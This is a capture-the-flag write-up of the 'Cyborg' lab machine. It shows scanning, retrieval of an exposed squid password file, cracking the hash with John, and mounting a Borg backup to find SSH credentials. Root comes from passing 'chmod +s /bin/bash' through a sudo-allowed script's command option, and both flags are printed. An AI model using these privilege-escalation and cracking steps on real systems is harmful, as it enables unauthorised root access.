# Cyborg

Laurent Chauvin | November 02, 2022

## Resources

[1] http://www.squid-cache.org/

[2] https://gist.github.com/jackblk/fdac4c744ddf2a0533278a38888f3caf

## Progress

```
export IP=10.10.59.152
```

Nmap scan
```
nmap -sC -sV -oN nmap/initial $IP    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 01:09 EDT
Nmap scan report for 10.10.59.152
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.25 seconds
```

Gobuster scan
```
gobuster dir -u $IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | tee gobuster.log
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.59.152
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/11/02 01:09:58 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.10.59.152/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.10.59.152/etc/]
```

Nikto scan
```
nikto -h "http://$IP" | tee nikto.log
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.59.152
+ Target Hostname:    10.10.59.152
+ Target Port:        80
+ Start Time:         2022-11-02 01:10:13 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 5b7ab644f3043, mtime: gzip
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
+ OSVDB-3092: /admin/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.
+ /admin/index.html: Admin login page/section found.
+ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2022-11-02 01:29:24 (GMT-4) (1151 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Website seems to show Apache default page.

Let's check robots.txt. Nothing.

We found '/admin' and '/etc'. Let's check them.

Let's start with '/etc'.
We find a 'squid' directory with a 'passwd' file and a 'squid.conf'

From [1]
```
Squid is a caching proxy for the Web supporting HTTP, HTTPS, FTP, and more
```

Let's get them.
```
wget http://$IP/etc/squid/passwd
wget http://$IP/etc/squid/squid.conf
```

Let's check.
```
cat passwd

music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```
```                        
cat squid.conf                                

auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

'/usr/lib64/squid/basic_ncsa_auth' seems to use our previously found 'passwwd' for authentication.

We can see from [1] that hashes starting with $apr1$ seems to be MD5 hashed multiple times.
```
MD5
"$apr1$" + the result of an Apache-specific algorithm using an iterated (1,000 times) MD5 digest of various combinations of a random 32-bit salt and the password. See the APR source file apr_md5.c for the details of the algorithm.
```

Let's give it to John
```
john passwd_forJohn.txt --wordlist=/opt/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2022-11-02 01:23) 1.315g/s 51284p/s 51284c/s 51284C/s willies..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

My understanding is that I should use these credentials with squid 'login' but I'm not sure how to login.

In the meantime, I'm browsing the website, and found an archive to download at 'http://$IP/admin/archive.tar'
After extracting, it contains
```
-rw------- 1 kali kali   964 Dec 29  2020 config
drwx------ 3 kali kali  4096 Dec 29  2020 data
-rw------- 1 kali kali    54 Dec 29  2020 hints.5
-rw------- 1 kali kali 41258 Dec 29  2020 index.5
-rw------- 1 kali kali   190 Dec 29  2020 integrity.5
-rw------- 1 kali kali    16 Dec 29  2020 nonce
-rw------- 1 kali kali    73 Dec 29  2020 README
```

'config' has
```
[repository]
version = 1
segments_per_dir = 1000
max_segment_size = 524288000
append_only = 0
storage_quota = 0
additional_free_space = 0
id = ebb1973fa0114d4ff34180d1e116c913d73ad1968bf375babd0259f74b848d31
key = hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
        L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
        2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
        8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
        daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
        oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
        eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
        T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
        vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
        SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
        UCH8bjZLfc1GFsundmVyc2lvbgE=
```

When decoding key with base64
```
��algorithm�sha256�data���KzN�5�6&$d���@�����;
```

It seems it's using sha256.

```
cat nonce     

00000000200000b9
```

```
cat README 

This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

From the documentation
```
BorgBackup (short: Borg) is a deduplicating backup program. Optionally, it supports compression and authenticated encryption.

The main goal of Borg is to provide an efficient and secure way to backup data.
```

In 'data' folder, only '4' seems to really have data
```
drwx------ 2 kali kali    4096 Dec 29  2020 .
drwx------ 3 kali kali    4096 Dec 29  2020 ..
-rw------- 1 kali kali      17 Dec 29  2020 1
-rw------- 1 kali kali      17 Dec 29  2020 3
-rw------- 1 kali kali 1506824 Dec 29  2020 4
-rw------- 1 kali kali      17 Dec 29  2020 5
```

Install borg
```
sudo apt install borgbackup
```

Try to import config
```
borg config . key

hqlhbGdvcml0aG2mc2hhMjU2pGRhdGHaAZ6ZS3pOjzX7NiYkZMTEyECo+6f9mTsiO9ZWFV
L/2KvB2UL9wHUa9nVV55aAMhyYRarsQWQZwjqhT0MedUEGWP+FQXlFJiCpm4n3myNgHWKj
2/y/khvv50yC3gFIdgoEXY5RxVCXhZBtROCwthh6sc3m4Z6VsebTxY6xYOIp582HrINXzN
8NZWZ0cQZCFxwkT1AOENIljk/8gryggZl6HaNq+kPxjP8Muz/hm39ZQgkO0Dc7D3YVwLhX
daw9tQWil480pG5d6PHiL1yGdRn8+KUca82qhutWmoW1nyupSJxPDnSFY+/4u5UaoenPgx
oDLeJ7BBxUVsP1t25NUxMWCfmFakNlmLlYVUVwE+60y84QUmG+ufo5arj+JhMYptMK2lyN
eyUMQWcKX0fqUjC+m1qncyOs98q5VmTeUwYU6A7swuegzMxl9iqZ1YpRtNhuS4A5z9H0mb
T8puAPzLDC1G33npkBeIFYIrzwDBgXvCUqRHY6+PCxlngzz/QZyVvRMvQjp4KC0Focrkwl
vi3rft2Mh/m7mUdmEejnKc5vRNCkaGFzaNoAICDoAxLOsEXy6xetV9yq+BzKRersnWC16h
SuQq4smlLgqml0ZXJhdGlvbnPOAAGGoKRzYWx02gAgzFQioCyKKfXqR5j3WKqwp+RM0Zld
UCH8bjZLfc1GFsundmVyc2lvbgE=
```

Seems to read the config file.

Try to mount it
```
borg mount home/field/dev/final_archive borg_mnt 
Enter passphrase for key /home/kali/ctf/thm/Cyborg/home/field/dev/final_archive: 
```

It requires a passphrase. Interesting.

Try 'squidward', and.....no error.

Let's check mount point
```
ls borg_mnt

music_archive
```

Seems like it worked.

In 'borg_mnt/music_archive/home/alex' we have
```
tree               
.
├── Desktop
│   └── secret.txt
├── Documents
│   └── note.txt
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos
```

secret.txt
```
shoutout to all the people who have gotten to this stage whoop whoop!"
```

note.txt
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

Could be useful for ssh.
```
ssh alex@$IP               
alex@10.10.59.152's password: S3cretP@s3
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ 
```

We're in !!!

Let's get the flag
```
cat user.txt

flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

Time to privesc.

```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

Easy !! Let's modify backup.sh to run it with sudo.

Let's set SUID for bash
```
chmod +s /bin/bash
```

Hum !! Not so easy finally, backup.sh is owned by alex, but the directory mp3backups is owned by root and not writable.
Nevermind. Let's check this backup.sh.
```sh
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt


input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
   case "${flag}" in 
    c) command=${OPTARG};;
   esac
done



backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

'find' is called without any absolute path. As in alex's '.profile' we have
```
# set PATH so it includes user's private bin directories
PATH="$HOME/bin:$HOME/.local/bin:$PATH"
```

Let's try to create a bin directory inside alex's home, and create a 'find' file that will set the bash suid
```
mkdir bin
cd bin
touch find
nano find
chmod +x find
```

find is
```
#!/bin/bash
echo 'Set SUID'
chmod +s /bin/bash
```

Now let's call the backup file
```
sudo /etc/mp3backups/backup.sh
```

And.....Nothing. The file is not called. Probably not running the backup with alex's profile.

However, when going back to backup.sh, we can see that it can take an argument
```sh
while getopts c: flag
do
   case "${flag}" in 
    c) command=${OPTARG};;
   esac
done
```

And that argument will be executed
```sh

cmd=$($command)
echo $cmd
```

Let's call it with our command then
```
sudo /etc/mp3backups/backup.sh -c 'chmod +s /bin/bash'

/home/alex/Music/image12.mp3
/home/alex/Music/image7.mp3
/home/alex/Music/image1.mp3
/home/alex/Music/image10.mp3
/home/alex/Music/image5.mp3
/home/alex/Music/image4.mp3
/home/alex/Music/image3.mp3
/home/alex/Music/image6.mp3
/home/alex/Music/image8.mp3
/home/alex/Music/image9.mp3
/home/alex/Music/image11.mp3
/home/alex/Music/image2.mp3
find: ‘/run/user/108/gvfs’: Permission denied
Backing up /home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3 to /etc/mp3backups//ubuntu-scheduled.tgz

tar: Removing leading `/' from member names
tar: /home/alex/Music/song1.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song2.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song3.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song4.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song5.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song6.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song7.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song8.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song9.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song10.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song11.mp3: Cannot stat: No such file or directory
tar: /home/alex/Music/song12.mp3: Cannot stat: No such file or directory
tar: Exiting with failure status due to previous errors

Backup finished
```

No error. Let's check if it worked.
```
ls -al /bin/bash

-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

And it did !!!

Let's get the flag now.
```
alex@ubuntu:~$ /bin/bash -p
bash-4.3# whoami

root
```

```
cat /root/root.txt

flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

And we're done.

## Flag

1. User

```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

2. Privesc

```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```
